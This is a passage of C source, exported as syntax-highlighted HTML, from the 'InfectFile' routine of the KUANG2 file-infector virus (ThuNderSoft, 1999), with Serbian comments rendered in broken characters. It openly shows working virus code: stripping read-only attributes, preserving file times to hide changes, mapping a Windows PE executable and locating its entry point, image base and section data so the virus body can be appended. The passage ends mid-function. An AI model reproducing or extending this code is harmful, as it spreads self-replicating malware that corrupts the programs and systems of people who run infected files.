<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/***[ThuNderSoft]*************************************************************
                               KUANG2: InfectFile
                                   ver: 0.19
                                ˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/</span><span class="sc0">

</span><span class="sc1">/* HISTORY */</span><span class="sc0">
</span><span class="sc2">// ver 0.19 (26-may-1999): test mod
// ver 0.18 (19-may-1999): overlay, bss sekcije
// ver 0.16 (18-may-1999): bug kod ITrva2ofs, viÑe istih DLLova
// ver 0.14 (15-may-1999): HNA i IAT
// ver 0.10 (14-may-1999): born code
</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;ctypew.h&gt;
#include &lt;win95e.h&gt;
</span><span class="sc0">
</span><span class="sc2">// kada je definisan I_TESTMODE onda beleÇi sve informacije
// prilikom inficiranja fajla
//#define I_TESTMODE
</span><span class="sc0">
</span><span class="sc2">// kada je definisan I_TESTMODE_API onda zapiÑi i sve import funkcije!
//#define I_TESTMODE_API
</span><span class="sc0">



</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">testIfile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Iwritten</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">_testb</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc2">// potpis ms-dos exe fajla
</span><span class="sc9">#define     IMAGE_DOS_SIGNATURE1    0x5A4D      </span><span class="sc2">// MZ
</span><span class="sc9">#define     IMAGE_DOS_SIGNATURE2    0x4D5A      </span><span class="sc2">// ZM
</span><span class="sc0">
</span><span class="sc2">// orijentaciona veÜa vrednost veliÅine virusa (za potrebe mapiranja fajla)
</span><span class="sc9">#define     VIRUSLEN    12500
</span><span class="sc0">
</span><span class="sc2">// ime .exe fajla koji se dodaje na host PE exe
// (to je, u stvari, ime samog Kuang2.exe iz komandne linije)
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">addfile</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// externe promenljive iz samog virusa
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">virus_start</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">addfile_size</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">oldEntryPoint</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldEntryPointRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldEPoffs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldfilesize</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">oldoffs1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">olddata1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldoffs2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">olddata2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldoffs3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">olddata3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldoffs4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">olddata4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldoffs5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">olddata5</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ddGetModuleHandleA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ddGetProcAddress</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">kript</span><span class="sc10">;</span><span class="sc0">



</span><span class="sc1">/*
    InfectFile
    ----------
  ˛ Inficira neki PE EXE fajl, koji je dat kao argument.
  ˛ Ne proverava se extenzija, ni da li je fajl veÜ zaraÇen.
  ˛ öuvaju se atributi i vreme upisa.
  ˛ VraÜa 0 ako je sve u redu. */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">InfectFile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fname</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hfilemap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">haddfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fsize</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// veliÅina fajla
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filemap</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// pointer na MMF
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filestart</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// uvek pointer na poÅetak MMF
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retvalue</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// povratna vrednost iz ove f-je
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fattr</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// atributi fajla
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// broj sekcija PE fajla
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">EntryPointRVA</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// pointer na mesto u fajlu gde se Åuva EntryPoint RVA
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ImageBase</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc2">// Image base adresa
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">SectionAlign</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// alignment veliÅine svake sekcije
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">SizeofImage</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// pointer na SizeOfImage
</span><span class="sc0">    </span><span class="sc11">PIMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc11">entry_idd</span><span class="sc10">;</span><span class="sc2">// pointer na prvi Data directorys
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ImportTable</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// Import Table
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ISrva2ofs</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc2">// konverzija RVA u file ofset (za ImportSekciju)
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">IAT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">HNA</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// Import Address Table &amp; Hint Name Address
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">UseT</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// ili IAT ili HNA
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">module_name</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// ime IMPORT modula
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virusstart</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// file offset gde Üe poÅeti virus
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">kernel32</span><span class="sc10">[]=</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// kernel32.dll
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">getmodulehandle</span><span class="sc10">[]=</span><span class="sc6">"GetModuleHandleA"</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// imena f-ja
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">getprocaddress</span><span class="sc10">[]=</span><span class="sc6">"GetProcAddress"</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// koje traÇimo
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">GetModuleHandleRVA</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// RVA adresa gde Üe virus...
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">GetProcAddressRVA</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// ...naÜi ove funkcije
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">                             </span><span class="sc2">// pomoÜne promenljive
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">raw_virussize</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// veliÅina samo virus koda (bez add exe)
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">align_virussize</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// align veliÅina virus
</span><span class="sc0">    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc2">// veliÅina overlaya ako je ima
</span><span class="sc0">    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">creation_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lastacc_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lastwr_time</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define     function_name       module_name
</span><span class="sc0">
</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">testIfile</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"c:\\k2test_i.dat"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">




</span><span class="sc3">/*** POöETAK &amp; PRIPREMA FAJLOVA ***/</span><span class="sc0">

    </span><span class="sc2">// uzmi atribute fajla i ako je setovan read-only onda ga resetuj
</span><span class="sc0">    </span><span class="sc11">fattr</span><span class="sc10">=</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">// uzmi atribute fajla
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fattr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc2">// resetuj readonly ako ga ima
</span><span class="sc0">        </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fattr</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// otvari fajl
</span><span class="sc0">    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fattr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x10</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end1</span><span class="sc10">;}</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nopen"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc2">// uzmi veliÅinu fajla
</span><span class="sc0">    </span><span class="sc11">fsize</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fsize</span><span class="sc10">&gt;</span><span class="sc4">0xFFFFFFFF</span><span class="sc10">-</span><span class="sc11">VIRUSLEN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x11</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end2</span><span class="sc10">;}</span><span class="sc0">  </span><span class="sc2">// ako je fajl prevelik
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fsize</span><span class="sc10">&lt;</span><span class="sc4">256</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x11</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end2</span><span class="sc10">;}</span><span class="sc0">                  </span><span class="sc2">// ako je fajl suviÑe mali
</span><span class="sc0">    </span><span class="sc11">oldfilesize</span><span class="sc10">=</span><span class="sc11">fsize</span><span class="sc10">;</span><span class="sc0">                      </span><span class="sc2">// zapamti i originalnu veliÅinu fajla
</span><span class="sc0">
    </span><span class="sc2">// saÅuvaj original vreme fajla
</span><span class="sc0">    </span><span class="sc11">GetFileTime</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">creation_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lastacc_time</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lastwr_time</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// kreiraj MMF
</span><span class="sc0">    </span><span class="sc11">hfilemap</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fsize</span><span class="sc10">+</span><span class="sc11">VIRUSLEN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfilemap</span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x12</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end2</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc2">// kreiraj MMF view na ceo fajl
</span><span class="sc0">    </span><span class="sc11">filemap</span><span class="sc10">=(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfilemap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_MAP_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filemap</span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x13</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end3</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc11">filestart</span><span class="sc10">=</span><span class="sc11">filemap</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nmapped"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc2">// proveri da li je fajl DOS .EXE
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">IMAGE_DOS_SIGNATURE1</span><span class="sc10">)</span><span class="sc0">         </span><span class="sc2">// e_magic == MZ ?
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">IMAGE_DOS_SIGNATURE2</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc2">// e_magic == ZM ?
</span><span class="sc0">            </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x101</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">                                </span><span class="sc2">// nije, izaîi
</span><span class="sc0">
    </span><span class="sc2">// pomeri se na adresu PE exe header-a
</span><span class="sc0">    </span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_DOS_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// proveri da signature odgovara PE exe fajlu
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IsBadCodePtr</span><span class="sc10">((</span><span class="sc11">FARPROC</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x102</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc2">// 'PE00'
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x102</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">

    </span><span class="sc2">// preskoÅi signature i sada smo na poÅetku PE headera
</span><span class="sc0">    </span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nPEok"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">




</span><span class="sc3">/*** PREUZIMANJE PODATAKA ***/</span><span class="sc0">

    </span><span class="sc2">// preuzmi broj sekcija
</span><span class="sc0">    </span><span class="sc11">NumberOfSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_FILE_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// preskoÅi PE header i sada pokazujemo na PE Optional header
</span><span class="sc0">    </span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// proveri da li je exe fajl za GUI (nije konzolna aplikacija)
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">PIMAGE_OPTIONAL_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Subsystem</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x103</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">

    </span><span class="sc2">// zapamti pointer na entry pointa
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// 16 je ofset do EntryPoint-a
</span><span class="sc0">    </span><span class="sc11">EntryPointRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// zapamti ImageBase
</span><span class="sc0">    </span><span class="sc11">ImageBase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_OPTIONAL_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">ImageBase</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// zapamti Alignment sekcija
</span><span class="sc0">    </span><span class="sc11">SectionAlign</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_OPTIONAL_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">FileAlignment</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// preuzmi pointer na SizeOfImage
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">56</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// 56 je ofset do SizeOfImage
</span><span class="sc0">    </span><span class="sc11">SizeofImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
